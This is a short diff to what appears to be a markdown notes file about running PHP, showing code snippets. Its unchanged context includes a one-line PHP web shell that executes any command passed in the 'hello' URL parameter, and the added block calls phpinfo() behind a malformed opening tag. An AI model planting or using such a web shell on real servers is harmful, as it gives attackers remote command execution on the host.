@@ -13,3 +13,7 @@ php file.php
 ```php
 <?php system($_GET['hello']); ?>
 ```
+
+```PHP
+<php echo("Hello");phpinfo(); ?>
+```
